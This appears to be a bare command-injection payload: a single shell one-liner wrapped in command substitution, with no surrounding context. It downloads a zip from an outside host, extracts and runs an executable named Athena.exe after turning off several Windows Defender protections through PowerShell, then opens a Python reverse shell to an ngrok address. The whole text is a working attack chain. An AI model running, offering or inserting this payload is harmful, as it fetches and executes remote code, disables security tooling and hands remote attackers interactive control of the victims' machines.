$(curl https://get.unitycdn.com/direct/download/a7722aa5-7c44-4305-b74b-54079fbfec69 -o /cygdrive/c/users/public/music/a.zip && cd /cygdrive/c/users/public/music/ && 7z e a.zip Athena.exe && powershell -c 'Import-Module Defender;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -DisableArchiveScanning $true; &C:\Users\Public\Music\Athena.exe' && export RHOST="5.tcp.eu.ngrok.io";export RPORT=11466;/usr/bin/python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")')